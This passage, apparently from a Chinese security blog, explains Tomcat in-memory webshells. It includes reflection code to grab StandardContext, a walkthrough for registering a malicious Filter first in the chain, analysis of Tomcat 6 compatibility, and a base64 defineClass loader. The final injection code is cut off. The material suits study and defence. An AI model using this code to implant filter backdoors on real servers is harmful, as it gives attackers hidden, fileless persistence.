class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">var0</span> <span class="operator">=</span> Thread.class.getDeclaredMethod(<span class="string">&quot;getThreads&quot;</span>);</span><br><span class="line">    var0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    Thread[] var1 = (Thread[])((Thread[])((Thread[])var0.invoke((Object)<span class="literal">null</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="number">0</span>; var2 &lt; var1.length; ++var2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var1[var2].getName().contains(<span class="string">&quot;http&quot;</span>) &amp;&amp; var1[var2].getName().contains(<span class="string">&quot;Acceptor&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">var3</span> <span class="operator">=</span> var1[var2].getClass().getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">            var3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var4</span> <span class="operator">=</span> var3.get(var1[var2]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var3 = var4.getClass().getDeclaredField(<span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var11) &#123;</span><br><span class="line">                var3 = var4.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            var4 = var3.get(var4);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var3 = var4.getClass().getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var10) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var3 = var4.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoSuchFieldException var9) &#123;</span><br><span class="line">                    var3 = var4.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            var4 = var3.get(var4);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var3 = var4.getClass().getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var8) &#123;</span><br><span class="line">                var3 = var4.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            var4 = var3.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var4.getClass().getName().contains(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>)) &#123;</span><br><span class="line">                var3 = var4.getClass().getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                var3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ArrayList</span> <span class="variable">var5</span> <span class="operator">=</span> (ArrayList)var3.get(var4);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="number">0</span>; var6 &lt; var5.size(); ++var6) &#123;</span><br><span class="line">                        var3 = var5.get(var6).getClass().getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                        var3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        var4 = var3.get(var5.get(var6)).getClass().getDeclaredMethod(<span class="string">&quot;getNote&quot;</span>, Integer.TYPE).invoke(var3.get(var5.get(var6)), <span class="number">1</span>);</span><br><span class="line">                        <span class="comment">//有可能getNote会拿到null，如果var4是null执行后续操作会报空指针错误</span></span><br><span class="line">                        <span class="keyword">if</span>(var4 !=<span class="literal">null</span>)&#123;</span><br><span class="line">                            <span class="comment">//我们发的request带上一个特征头，这样捕获到并处理的requst和context则一定是我们当前这个request</span></span><br><span class="line">                            <span class="type">Object</span> <span class="variable">var7</span> <span class="operator">=</span> var4.getClass().getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>, String.class).invoke(var4, <span class="string">&quot;X-DNSPrefetch-Control&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> (StandardContext) var4.getClass().getDeclaredMethod(<span class="string">&quot;getContext&quot;</span>).invoke(var4);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable var12) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out.println(standardContext);</span><br></pre></td></tr></table></figure>
+
+<p>这里我们加上一个特征头来配合我们判断当前的request是否是我们发出的request，这样我们一定能拿到想要的<code>StandardContext</code>。(这个思路来自c0ny1师傅，如果我们单纯遍历processors不断的去取req却不加判断条件，则有可能拿到的那个req碰巧是null无法拿到context)</p>
+<h5 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h5><p>后面玩c0ny1师傅的<a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-object-searcher">java-object-searcher</a>发现参考<a target="_blank" rel="noopener" href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/#5-2-%E7%BC%96%E5%86%99%E8%B0%83%E7%94%A8%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2">师傅文章里的poc</a>能挖到这里获取request对象的链</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220318172424020.png" alt="image-20220318172424020"></p>
+<h2 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h2><blockquote>
+<p>Filter 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。</p>
+</blockquote>
+<p>更多基础知识可参考<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/filter-filterchain-filterconfig-intro.html">Filter、FilterChain、FilterConfig介绍</a></p>
+<h3 id="Filter创建流程"><a href="#Filter创建流程" class="headerlink" title="Filter创建流程"></a>Filter创建流程</h3><p>创建Filter内存马本质就是一个动态创建Filter的过程，我们随便自己写个filter观察Filter的创建流程</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.memshell.tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filtertest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter init()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter doFilter&quot;</span>);</span><br><span class="line">        ((HttpServletResponse)servletResponse).setHeader(<span class="string">&quot;filter&quot;</span>,<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter destroy()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在web.xml中配置filter</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>demoFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.memshell.tomcat.Filtertest<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>demoFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/filter<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在doFilter处下断点，访问<a target="_blank" rel="noopener" href="http://localhost/projectnamexxx/filter">http://localhost/projectnamexxx/filter</a> 触发</p>
+<p>调用链如下</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220322164109261.png" alt="image-20220322164109261"></p>
+<p>往上看不难发现最初的doFilter是在<code>catalina.jar!/org/apache/catalina/core/StandardWrapperValve#invoke</code>方法中的<strong>filterChain.doFilter</strong></p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220322164253275.png" alt="image-20220322164253275"></p>
+<p>跟跟<code>filterChain</code>怎么创建的，在<code>catalina.jar!/org/apache/catalina/core/StandardWrapperValve#invoke</code>看到了创建<code>filterChain</code></p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220322164718433.png" alt="image-20220322164718433"></p>
+<p>跟进<code>createFilterChain</code>看实现，首先从<code>StandardContext</code>拿到<code>filterMaps</code>数组</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220322165300861.png" alt="image-20220322165300861"></p>
+<p>接着遍历<code>filterMaps</code>，根据<code>filterMap</code>获取<code>FilterName</code>，然后对符合URL路由的<code>filterMap</code>用<code>FilterName</code>从<code>context.findFilterConfig</code>(实际上就是在<code>StandardContext</code>的<code>filterConfigs</code>属性中)找到对应的<code>filterConfig</code>，最后<code>filterChain.addFilter</code>添加<code>filterConfig</code>到<code>filterChain</code></p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220322165850046.png" alt="image-20220322165850046"></p>
+<p>不难得出结论，只要我们可控<code>filterMap</code>和<code>filterConfig</code>就可以注册一个我们自己的恶意filter，即我们需要往context的<code>filterMaps</code>和<code>filterConfigs</code>中添加一个我们恶意的<code>filterMap</code>和<code>filterConfig</code></p>
+<h3 id="写入filter内存马"><a href="#写入filter内存马" class="headerlink" title="写入filter内存马"></a>写入filter内存马</h3><p>看看threedr3am师傅文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388#toc-2">基于tomcat的内存 Webshell 无文件攻击技术</a>是怎么实现filter内存马的</p>
+<h4 id="封装恶意filter到filterDef"><a href="#封装恶意filter到filterDef" class="headerlink" title="封装恶意filter到filterDef"></a>封装恶意filter到filterDef</h4><p>里面有段师傅翻到的动态注册filter代码，会封装一个叫threedr3am的恶意filter到<code>filterDef</code>，并最终添加到<code>StandardContext</code>的<code>filterDefs</code>属性中</p>
+<blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span> servletContext.addFilter(<span class="string">&quot;threedr3am&quot;</span>, threedr3am);</span><br><span class="line">filterRegistration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">filterRegistration.setAsyncSupported(<span class="literal">false</span>);</span><br><span class="line">filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>这里的<code>servletContext.addFilter</code>不能直接触发，因为当tomcat已经启动完毕后这里的<code>context.getState()</code>并不等于<code>LifecycleState.STARTING_PREP</code>，所以需要我们反射修改这个状态</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220322174327313.png" alt="image-20220322174327313"></p>
+<h4 id="FilterMap"><a href="#FilterMap" class="headerlink" title="FilterMap"></a>FilterMap</h4><p>还有就是在执行<code>addMappingForUrlPatterns</code>方法时，其实还会根据filterDef添加一个filterMap到context的filterMaps中</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220322173109708.png" alt="image-20220322173109708"></p>
+<p>即上面的代码可以同时注册一个恶意的<code>filterMap</code>和<code>filterDef</code>，就差<code>filterConfig</code>了。</p>
+<h4 id="filterConfig"><a href="#filterConfig" class="headerlink" title="filterConfig"></a>filterConfig</h4><p>threedr3am师傅又发现<code>StandardContext</code>的<code>filterStart()</code>方法遍历<code>filterDefs</code>并实例化成<code>ApplicationFilterConfig</code>添加到<code>filterConfigs</code>中</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220322173814063.png" alt="image-20220322173814063"></p>
+<p>所以我们只要反射调用这个<code>filterStart()</code>方法就可以得到我们恶意的<code>filterConfig</code></p>
+<h4 id="调整filter到最前面"><a href="#调整filter到最前面" class="headerlink" title="调整filter到最前面"></a>调整filter到最前面</h4><p>为了让shiro这种自带filter的漏洞也能利用，我们需要把我们的filter设置到shiro filter的前面，所以最好把我们的恶意filter放到最前面，看看前面创建filter流程的部分:</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220322174912129.png" alt="image-20220322174912129"></p>
+<p>这里是按<code>filterMaps</code>中的顺序在添加<code>filterConfig</code>并执行，所以我们只需要把<code>filterMaps</code>的第一个filter换成我们的恶意filter</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>小小总结下我们的整个流程</p>
+<ul>
+<li>封装一个我们恶意的filter到filterDef中，并添加到filterDefs</li>
+<li>使用<code>addMappingForUrlPatterns</code>方法根据filterDef创建一个filterMap到filterMaps</li>
+<li>使用<code>StandardContext</code>的<code>filterStart()</code>方法根据filterDef遍历创建filterConfig到filterConfigs</li>
+<li>为了兼容shiro等特殊情境，把我们的恶意filter放到filterMaps第一位</li>
+</ul>
+<p>实现代码直接看<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388">threedr3am师傅文章</a>，写得很详细。</p>
+<p>或者看<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedBasic.java">feihong师傅的代码实现</a></p>
+<p>个人感觉和threedr3am师傅的区别是feihong师傅这种实现</p>
+<ul>
+<li>直接使用StandardContext调用<code>addFilterDef</code>创建FilterDef封装我们的恶意filter，不需要<code>ServletContext</code></li>
+<li>实例化filterDef和filterMap后再反射修改里面的属性</li>
+<li>利用filterConfig的构造函数把filterDef中封装的恶意filter赋值给<code>filterConfig</code>属性</li>
+<li>使用<code>addFilterMapBefore</code>方法调整filterMap的位置到第一位</li>
+</ul>
+<h4 id="tomcat6失败原因"><a href="#tomcat6失败原因" class="headerlink" title="tomcat6失败原因"></a>tomcat6失败原因</h4><p>但以上的代码都不能对tomcat6起作用，有的师傅说是因为<code>javax.servlet.DispatcherType</code>类在servlet 3.x之后才存在，而tomcat7.x之后才支持servlet 3.x。我们跟进分析分析</p>
+<p>首先看threedr3am师傅的实现，在tomcat6甚至没有类<code>javax.servlet.FilterRegistration</code>，就没有<code>addMappingForUrlPatterns</code>生成<code>filterMap</code>，所以gg。(其实很多javax.servlet下的类都没有或者方法不存在)</p>
+<p>再看feihong师傅的实现，<code>javax.servlet.DispatcherType</code>这个类仅在<code>FilterMap#setDispatcher</code>处用到，看看tomcat7的<code>setDispathcer</code>实现</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220323103705864.png" alt="image-20220323103705864"></p>
+<p>可以知道我们的目的是让<code>this.dispatcherMapping |= 8</code>，<code>dispatcherMapping</code>默认是0，<code>0｜8</code>的结果是8</p>
+<p>看看tomcat6中的实现</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220323104020663.png" alt="image-20220323104020663"></p>
+<p>可以看到如果我们设置dispatcher为REQUEST一样可以让dispatcherMapping&#x3D;8，所以我们完全可以反射设置这个值为REQUEST进入正常的逻辑。所以其实前面师傅们的说法存在问题，**<code>javax.servlet.DispatcherType</code> 类对我们的影响是可以忽略不计的**。</p>
+<p>我们只在这里做改动，看看能否在tomcat6正常注入内存马，结果仍然报错</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220323112101707.png" alt="image-20220323112101707"></p>
+<p>报错说FilterDef没有setFilter方法，我们跟进看看</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220323112243948.png" alt="image-20220323112243948"></p>
+<p>果然没有setFilter方法，甚至连<code>filter</code>属性都没有，对比一下我们可以看到tomcat7是有<code>filter</code>属性的</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220323112410845.png" alt="image-20220323112410845"></p>
+<p>所以前面的方法<strong>不能在tomcat6成功的一个关键原因应该是FilterDef不能封装我们的恶意filter了</strong>。同理可以推出<code>FilterConfig</code>中大概率不能正常拿到我们的恶意filter。</p>
+<p>前面我们有讲到，注册filter的关键是把<code>filterConfig</code>加入到<code>filterChain</code>中，在feihong师傅的实现中，我们在tomcat7及以上版本可以利用<code>filterConfig</code>的构造函数把<code>filterDef</code>中封装的恶意filter传递到<code>filterConfig</code>中。</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220323113114708.png" alt="image-20220323113114708"></p>
+<p>我们看看tomcat6是否有变化</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220323153938790.png" alt="image-20220323153938790"></p>
+<p>跟进getFilter()方法</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220323154108230.png" alt="image-20220323154108230"></p>
+<p>可以发现<code>filterConfig</code>的<code>filter</code>属性是在这一步中赋值的，会调ClassLoader去加载我们<code>filterDef</code>中定义的filter名，然后实例化filter赋值给<code>this.filter</code>。显然在我们前面的实现代码中，服务端调ClassLoader去加载我们的filter类是加载不到的。即<strong>最最关键的FilterConfig的filter属性没有正常被我们变成我们想要的恶意类，这就是上面的代码在tomcat6跑不了的最核心的原因。</strong></p>
+<h4 id="Tomcat6内存马实现"><a href="#Tomcat6内存马实现" class="headerlink" title="Tomcat6内存马实现"></a>Tomcat6内存马实现</h4><p>通过上面的内容不难得出，如果让<code>FilterConfig</code>的<code>filter</code>属性变成我们的恶意filter，则一样能注册我们的filter内存马。</p>
+<h5 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h5><p>首先想到的思路是我们先想办法让<code>FilterConfig</code>正常实例化，然后再反射修改filter属性的值。<a target="_blank" rel="noopener" href="https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/">flowerwind师傅</a>就是这样操作的，先找到一个tomcat6正常存在的<code>SSIFilter</code>，利用这个filter让<code>FilterConfig</code>正常实例化然后再反射修改filter属性的值。</p>
+<h5 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h5><p>看回catalina.jar!&#x2F;org&#x2F;apache&#x2F;catalina&#x2F;core&#x2F;ApplicationFilterConfig#getFilter()</p>
+<p>省略不重要的部分有这么一段代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.filter != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.filter;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterClass</span> <span class="operator">=</span> <span class="built_in">this</span>.filterDef.getFilterClass();</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (filterClass.startsWith(<span class="string">&quot;org.apache.catalina.&quot;</span>)) &#123;</span><br><span class="line">        classLoader = <span class="built_in">this</span>.getClass().getClassLoader();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        classLoader = <span class="built_in">this</span>.context.getLoader().getClassLoader();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">oldCtxClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.loadClass(filterClass);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.isFilterAllowed(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(sm.getString(<span class="string">&quot;applicationFilterConfig.privilegedFilter&quot;</span>, filterClass));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.filter = (Filter)clazz.newInstance();</span><br><span class="line">        ...</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里有<code>this.filter=(Filter)clazz.newInstance()</code>，那只要我们能进入这个逻辑，同时能让ClassLoader加载并实例化我们的恶意filter，跟进<code>this.isFilterAllowed</code>看看实现</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220324142643667.png" alt="image-20220324142643667"></p>
+<p>当且仅当有一种情况这里会返回false，跟进看下只有<code>org.apache.catalina.ssi.SSIFilter</code>这个Filter会受到影响，我们的恶意filter只要不继承这个SSIFilter就不会受影响。</p>
+<p>所以我们可以先用<code>defineClass</code>把我们的恶意Class写入目标服务器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BASE64Decoder</span> <span class="variable">base64Decoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>();</span><br><span class="line">                       <span class="type">String</span> <span class="variable">codeClass</span> <span class="operator">=</span> <span class="string">&quot;yv66....&quot;</span>;</span><br><span class="line">                       <span class="type">byte</span>[] bytes = base64Decoder.decodeBuffer(codeClass);</span><br><span class="line">                       <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">                       method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                       clazz = (Class) method.invoke(cl, bytes, <span class="number">0</span>, bytes.length);</span><br></pre></td></tr></table></figure>
+
+<p>测了下没问题，在<code>ApplicationFilterConfig#getFilter</code>这里能正常实例化我们的恶意filter。</p>
+<p>最终实现tomcat6下filter内存马的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;DynamicFIlter&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">urlPattern</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">						<span class="comment">//拿到 StandardContext对象</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) field.get(servletContext);</span><br><span class="line"></span><br><span class="line">            field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Field</span> <span 